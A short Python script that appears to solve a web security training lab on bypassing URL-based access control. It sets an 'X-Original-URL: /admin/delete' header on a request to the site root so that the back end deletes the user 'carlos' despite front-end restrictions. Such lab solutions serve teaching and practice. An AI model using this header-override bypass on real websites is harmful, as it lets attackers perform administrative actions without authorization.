#!/usr/bin/env python3
"""URL-based access control can be circumvented"""

from lab_04 import Lab

def main() -> None:
    """Entry point"""
    site = Lab()
    site.session.headers.update({"X-Original-URL": "/admin/delete"})
    payload = {"username": "carlos"}
    site.session.get(url=site.url + "/", params=payload)

if __name__ == "__main__":
    main()
